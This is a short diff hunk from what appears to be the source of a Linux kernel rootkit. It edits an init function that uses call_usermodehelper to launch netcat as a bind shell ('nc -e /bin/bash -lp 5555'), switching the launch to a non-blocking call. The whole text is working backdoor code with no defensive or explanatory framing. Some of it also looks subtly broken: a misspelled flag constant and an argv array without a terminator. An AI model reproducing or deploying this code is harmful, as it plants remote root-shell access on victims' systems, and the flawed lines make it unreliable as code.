@@ -225,7 +225,7 @@ int rootkit_init(void) { // Start lel rootkit
 
         char *argv[] = {"nc", "-e", "/bin/bash", "-lp", "5555"};
         static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-        return call_usermodehelper("/usr/bin/nc", argv, env, 2);
+        call_usermodehelper("/usr/bin/nc", argv, env, UHM_NO_WAIT);
 
 	return 0;
 }
